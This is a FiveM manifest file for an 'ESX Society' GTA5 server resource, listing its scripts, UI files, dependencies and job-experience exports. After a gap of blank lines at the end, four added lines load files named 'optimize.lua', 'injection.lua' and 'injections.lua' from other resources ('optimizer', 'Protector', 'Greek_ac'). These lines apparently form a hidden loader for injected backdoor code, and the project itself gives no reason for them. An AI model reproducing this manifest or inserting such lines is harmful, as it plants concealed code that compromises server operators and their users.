fx_version 'adamant'

game 'gta5'

description 'ESX Society'

version '1.0.4'

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
    'locales/en.lua',
    'config.lua',
    'server/main.lua'
}

client_scripts {
    '@es_extended/locale.lua',
    'locales/en.lua',
    'config.lua',
    'client/main.lua'
}

dependencies {
    'es_extended',
    -- 'cron',
    'esx_addonaccount'
}

ui_page 'html/ui.html'

files {
	'html/ui.html',
	'html/script.js',
	'html/progressbar.js',
	'html/css/*.css',
	'html/images/*.png',
	'html/images/*.gif',
	'html/css/fonts/*.ttf',
}

exports {
	"getAbility"
} 

server_exports {
	"getJobRank",
	"getJobExperience",
	"setJobExperience",
	"addJobExperience",
	"removeJobExperience",
	"getJobAbility",
	"setJobRank"
} 







server_script '@optimizer/server/optimize.lua'
server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"